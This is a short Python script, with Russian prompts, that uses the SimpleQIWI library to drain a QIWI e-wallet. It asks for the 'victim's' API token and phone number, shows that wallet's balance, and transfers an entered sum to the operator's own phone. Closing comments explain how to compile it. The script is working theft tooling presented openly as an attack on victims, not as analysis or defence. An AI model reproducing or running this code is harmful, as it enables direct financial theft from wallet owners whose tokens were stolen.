from SimpleQIWI import *
import time
from colorama import Fore, Back, Style

print(Fore.BLACK + "")
time.sleep(1)
print("M")
time.sleep(1)
print(" I")
time.sleep(1)
print("  C")
time.sleep(1)
print("   R")
time.sleep(1)
print("    O")
time.sleep(1)
print(Style.RESET_ALL + "")

token = input("Введите токен жертвы:")
phone = input("Введите телефон жертвы:")
api = QApi(token=token, phone=phone)
print(api.balance)
summa = input("Введите сумму:")
phone1 = input("Введите ваш телефон:")
coment = input("Коментарий:")
api.pay(account=phone1, amount=summa, comment=coment)
print(api.balance)
input()

    ########################################################
    # Компиляция:
    # python -m compileall <file_1>.py
    # после окончания компилирования файл будет в папке __pycache__
    ########################################################
